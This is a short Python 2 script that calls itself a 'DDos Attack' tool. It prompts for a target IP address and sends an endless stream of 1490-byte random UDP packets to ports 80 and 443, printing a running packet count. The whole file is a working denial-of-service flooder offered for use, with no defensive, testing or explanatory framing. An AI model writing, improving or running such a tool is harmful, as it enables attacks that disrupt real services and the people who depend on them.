import sys
import os
import socket
import random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
os.system("figlet DDos Attack")
ip = raw_input("Target : ")
sent = 1
while True:
     sock.sendto(bytes, (ip,80))
     sock.sendto(bytes, (ip,443))
     sent += 1
     print "Sent %s packet to %s throught port:80 and 443"%(sent,ip)
